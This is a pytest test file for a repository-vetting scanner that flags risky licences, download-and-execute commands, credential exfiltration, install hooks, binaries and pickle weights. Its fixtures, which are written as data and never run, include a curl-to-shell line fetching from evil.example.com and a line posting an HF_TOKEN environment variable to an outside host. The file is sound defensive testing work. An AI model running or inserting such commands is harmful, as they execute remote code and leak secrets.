"""vet_tool: reads files only; flags the patterns that matter. Fixtures are built in tmp_path, nothing is executed."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import vet_tool as V  # noqa: E402


def mk(tmp_path, files):
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content if isinstance(content, bytes) else content.encode())
    return tmp_path


def test_a_plain_mit_tool_is_low(tmp_path):
    mk(
        tmp_path,
        {"LICENSE": "MIT License\nPermission is hereby granted, free of charge", "a.py": "def f(x):\n    return x + 1\n"},
    )
    r = V.scan(tmp_path)
    assert r["verdict"] == "LOW" and r["licence"] == ["MIT"]


def test_no_licence_is_not_low(tmp_path):
    mk(tmp_path, {"a.py": "x = 1\n"})
    assert V.scan(tmp_path)["verdict"] == "MEDIUM"


def test_non_commercial_licence_is_high(tmp_path):
    mk(tmp_path, {"LICENSE": "For research use only, non-commercial.", "a.py": "x = 1\n"})
    r = V.scan(tmp_path)
    assert r["verdict"] == "HIGH" and "non-commercial" in r["licence"]


def test_download_and_execute_is_high(tmp_path):
    mk(tmp_path, {"LICENSE": "MIT License", "i.sh": "curl http://evil.example.com/x | sh\n"})
    r = V.scan(tmp_path)
    assert r["verdict"] == "HIGH" and any(f["id"] == "download-execute" for f in r["findings"])
    assert "evil.example.com" in r["domains"]


def test_keys_plus_network_in_one_file_is_high(tmp_path):
    mk(
        tmp_path,
        {"LICENSE": "MIT License", "n.py": "import os, requests\nrequests.post('https://x.io', data=os.environ['HF_TOKEN'])\n"},
    )
    r = V.scan(tmp_path)
    assert r["verdict"] == "HIGH" and any("reads keys AND" in x for x in r["reasons"])


def test_install_hooks_and_binaries_and_pickle_weights(tmp_path):
    mk(
        tmp_path,
        {
            "LICENSE": "MIT License",
            "package.json": '{"scripts": {"postinstall": "node x.js"}}',
            "tool.exe": b"MZ\x90\x00",
            "w.ckpt": b"abc",
            "requirements.txt": "foo @ git+https://github.com/a/b\n",
        },
    )
    r = V.scan(tmp_path)
    assert r["verdict"] == "HIGH"
    assert r["binaries"][0]["file"] == "tool.exe" and len(r["binaries"][0]["sha256"]) == 64
    assert r["models"] == ["w.ckpt"] and len(r["hooks"]) == 2


def test_the_scan_never_executes_the_target(tmp_path):
    marker = tmp_path / "ran.txt"
    mk(tmp_path, {"LICENSE": "MIT License", "evil.py": f"open(r'{marker}', 'w').write('x')\n", "setup.py": "cmdclass = 1\n"})
    V.scan(tmp_path)
    assert not marker.exists()


def test_report_renders_with_verdict_and_checklist(tmp_path):
    mk(tmp_path, {"a.py": "eval('1')\n"})
    text = V.render(V.scan(tmp_path))
    assert "Verdict:" in text and "dynamic-exec" in text and "Pin the exact commit" in text
